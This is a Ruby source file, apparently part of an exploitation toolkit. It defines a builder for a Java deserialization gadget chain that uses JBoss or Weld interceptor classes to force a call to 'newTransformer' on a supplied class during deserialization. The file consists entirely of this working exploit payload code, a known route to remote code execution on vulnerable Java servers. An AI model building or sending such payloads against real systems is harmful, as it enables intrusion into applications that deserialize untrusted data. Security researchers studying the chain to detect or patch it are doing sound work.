require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module JBoss
        def make_invoke_noarg(obj, cls, _method, weld: false)
          pkg = if weld
                  'org/jboss/weld/interceptor/'
                else
                  'org/jboss/interceptor/'
                end
          p = 'L' + pkg

          tclass = Java::Serialize::JavaClass.new('Ljava/util/HashMap;')
          tgt = Java::Serialize::JavaObject.new('Ljava/util/HashMap;', {})
          itype = Java::Serialize::JavaEnum.new(p + 'spi/model/InterceptionType;', 'POST_ACTIVATE')

          interceptmeta = Java::Serialize::JavaObject.new(p + 'reader/SimpleInterceptorMetadata;', 'interceptorReference' => Java::Serialize::JavaObject.new(p + 'reader/ClassMetadataInterceptorReference;', 'classMetadata' => Java::Serialize::JavaObject.new(p + 'reader/ReflectiveClassMetadata;', 'clazz' => tclass)),
                                                                                                   'interceptorMethodMap' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
                                                                                                                                                               itype => Java::Serialize::JavaObject.new('Ljava/util/ArrayList;', 'elements' => [
                                                                                                                                                                                                          Java::Serialize::JavaObject.new(p + 'reader/DefaultMethodMetadata$DefaultMethodMetadataSerializationProxy;', 'methodReference' => Java::Serialize::JavaObject.new(p + 'builder/MethodReference;', 'methodName' => 'newTransformer',
                                                                                                                                                                                                                                                                                                                                                                                                            'parameterTypes' => Java::Serialize::JavaArray.new('Ljava/lang/Class;', []),
                                                                                                                                                                                                                                                                                                                                                                                                            'declaringClass' => Java::Serialize::JavaClass.new(cls)))
                                                                                                                                                                                                        ])
                                                                                                                                                             }))

          model = Java::Serialize::JavaObject.new(p + 'builder/InterceptionModelImpl;', 'globalInterceptors' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
                                                                                                                                                  itype => Java::Serialize::JavaObject.new('Ljava/util/ArrayList;', 'elements' => [interceptmeta])
                                                                                                                                                }),
                                                                                        'interceptedEntity' => tclass)

          Java::Serialize::JavaObject.new(p + 'proxy/InterceptorMethodHandler;', 'interceptionModel' => model,
                                                                                 'interceptorHandlerInstances' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
                                                                                                                                                    interceptmeta => obj
                                                                                                                                                  }),
                                                                                 'targetInstance' => tgt,
                                                                                 'invocationContextFactory' => Java::Serialize::JavaObject.new(p + 'proxy/DefaultInvocationContextFactory;', {}))
        end
        module_function :make_invoke_noarg
        end
    end
  end
end
